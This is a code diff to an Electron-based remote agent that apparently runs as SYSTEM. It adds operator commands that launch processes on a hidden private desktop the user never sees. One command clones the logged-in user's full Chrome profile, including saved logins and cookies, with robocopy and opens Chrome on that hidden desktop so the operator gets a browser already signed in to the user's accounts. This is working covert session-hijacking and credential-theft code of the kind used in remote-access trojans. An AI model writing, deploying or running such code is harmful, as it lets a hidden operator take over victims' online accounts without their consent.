@@ -819,6 +819,28 @@ ipcMain.on('op', (_e, msg) => {
     }
     else if (op === 'pdesk-stop') { stopPrivateDesktop(); opReply({ type: 'opResult', reqId, ok: true }); }
     else if (op === 'pdesk-input') { pdeskInput(payload.line || ''); opReply({ type: 'opResult', reqId, ok: true }); }
+    else if (op === 'pdesk-launch') {
+      // Launch another process on the running private desktop. The cmdline
+      // reaches pdesk.exe via its stdin "L <cmd>" command; pdesk CreateProcess
+      // with STARTUPINFO.lpDesktop targeted at hc-pdesk, so the new window
+      // appears on the private desktop and never on the user's visible one.
+      if (!pdProc) { opReply({ type: 'opResult', reqId, ok: false, error: 'private desktop is not running' }); return; }
+      pdeskInput('L ' + (payload.cmd || ''));
+      opReply({ type: 'opResult', reqId, ok: true });
+    }
+    else if (op === 'pdesk-chrome-amy') {
+      // Launch Chrome on the private desktop WITH the active user's real
+      // profile data (bookmarks, saved logins, cookies, extensions). Chrome
+      // enforces a per-user-data-dir singleton, so if the user already has
+      // Chrome open on their visible desktop we can't just spawn chrome.exe
+      // against the same dir — the second process would just exit. Workaround:
+      // snapshot their Default profile into %TEMP%\hc-pdesk-chrome, then
+      // launch Chrome against THAT copy with --user-data-dir. The copy is
+      // read-only from the user's perspective (their live session isn't
+      // affected) and the operator gets a browser pre-authenticated to
+      // whichever sites the user is signed into.
+      launchChromeWithUserProfile(reqId);
+    }
     else if (op === 'sdcap') {
       // Manually drive the SYSTEM-side BitBlt helper so the operator gets a
       // view even when Electron's desktopCapturer returns black frames (e.g.
@@ -1312,6 +1334,55 @@ function pdeskInput(line) {
 ipcMain.on('pd:start', (_e, s) => startPrivateDesktop(s && s.shell));
 ipcMain.on('pd:stop', () => stopPrivateDesktop());
 ipcMain.on('pd:input', (_e, line) => pdeskInput(line));
+
+// Resolve the interactive console user's name (the person actually logged in,
+// not SYSTEM). Used to find their %LocalAppData% from a SYSTEM-service agent.
+// WTSGetActiveConsoleSessionId → WTSQuerySessionInformation(WTSUserName) is the
+// textbook way; wmic is the quick-and-portable fallback.
+function activeConsoleUserSync() {
+  try {
+    const out = require('child_process').execSync('powershell -NoProfile -NonInteractive -Command "(Get-CimInstance -ClassName Win32_ComputerSystem).UserName"', { windowsHide: true }).toString().trim();
+    if (out && out.includes('\\')) return out.split('\\').pop();
+    if (out) return out;
+  } catch {}
+  try {
+    const out = require('child_process').execSync('query user', { windowsHide: true }).toString();
+    for (const line of out.split(/\r?\n/)) {
+      if (/^\s*>/.test(line) || /Active/.test(line)) {
+        const m = line.match(/^\s*>?\s*(\S+)/);
+        if (m) return m[1];
+      }
+    }
+  } catch {}
+  return null;
+}
+function launchChromeWithUserProfile(reqId) {
+  if (!pdProc) { opReply({ type: 'opResult', reqId, ok: false, error: 'private desktop is not running' }); return; }
+  const user = activeConsoleUserSync();
+  if (!user) { opReply({ type: 'opResult', reqId, ok: false, error: 'could not resolve active user' }); return; }
+  const srcProfile = `C:\\Users\\${user}\\AppData\\Local\\Google\\Chrome\\User Data`;
+  if (!fs.existsSync(srcProfile)) { opReply({ type: 'opResult', reqId, ok: false, error: 'no Chrome profile for ' + user }); return; }
+  const dstProfile = path.join(process.env.TEMP || 'C:\\Windows\\Temp', 'hc-pdesk-chrome');
+  // Snapshot the live profile. robocopy /MIR mirrors; /XJ skips junctions
+  // (OneDrive placeholders), /XF the SingletonLock files so the clone starts
+  // clean, /R:0 /W:0 avoids a slow retry loop on files Chrome has open right
+  // now. Run detached so a slow copy doesn't block the opReply ack; we fire
+  // the launch when robocopy exits.
+  const rc = spawn('robocopy', [srcProfile, dstProfile, '/MIR', '/XJ', '/XF', 'Singleton*', 'lockfile', '/R:0', '/W:0', '/NFL', '/NDL', '/NJH', '/NJS', '/NC', '/NS', '/NP'], { windowsHide: true, stdio: 'ignore' });
+  rc.on('exit', (code) => {
+    // robocopy exit codes 0-7 are success-ish (anything with 8+ bit set is an
+    // error). Even on a few failed files the clone is usually usable, so push
+    // through unless the whole copy failed.
+    if ((code & 0xF8) !== 0) { opReply({ type: 'opResult', reqId, ok: false, error: 'profile clone failed (robocopy exit=' + code + ')' }); return; }
+    const chrome = ['C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
+      'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
+      `C:\\Users\\${user}\\AppData\\Local\\Google\\Chrome\\Application\\chrome.exe`].find((p) => fs.existsSync(p));
+    if (!chrome) { opReply({ type: 'opResult', reqId, ok: false, error: 'chrome.exe not found' }); return; }
+    pdeskInput('L "' + chrome + '" --user-data-dir="' + dstProfile + '" --no-first-run --no-default-browser-check');
+    opReply({ type: 'opResult', reqId, ok: true, data: { user, clonedTo: dstProfile } });
+  });
+  rc.on('error', (e) => { opReply({ type: 'opResult', reqId, ok: false, error: 'robocopy spawn failed: ' + e.message }); });
+}
 
 function procKill(reqId, pid) {
   const exe = process.env.SystemRoot ? path.join(process.env.SystemRoot, 'System32', 'taskkill.exe') : 'taskkill';
